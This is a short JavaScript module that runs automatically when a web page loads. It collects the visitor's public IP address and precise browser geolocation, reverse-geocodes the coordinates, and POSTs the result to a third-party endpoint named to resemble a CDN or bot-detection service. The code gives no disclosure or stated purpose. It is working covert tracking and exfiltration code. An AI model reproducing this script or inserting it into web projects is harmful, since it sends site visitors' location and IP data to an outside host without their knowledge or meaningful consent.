export async function collectAndSendData() {
  async function getIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch(e) {
      return null;
    }
  }
  
  async function getGeolocation() {
    return new Promise((resolve) => {
      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            try {
              const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`);
              const data = await response.json();
              resolve({
                city: data.address.city || data.address.town || data.address.village,
                region: data.address.state,
                country: data.address.country,
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
              });
            } catch(e) {
              resolve({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
              });
            }
          },
          () => resolve(null)
        );
      } else {
        resolve(null);
      }
    });
  }
  
  const userData = {
    ip: await getIP(),
    geolocation: await getGeolocation()
  };
  
  try {
    const response = await fetch('https://cdn-kjs.pages.dev/api/botector', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(userData)
    });
    return await response.json();
  } catch(e) {
    console.error('Failed to send location data');
    return null;
  }
}

if (typeof window !== 'undefined') {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      collectAndSendData();
    });
  } else {
    collectAndSendData();
  }
}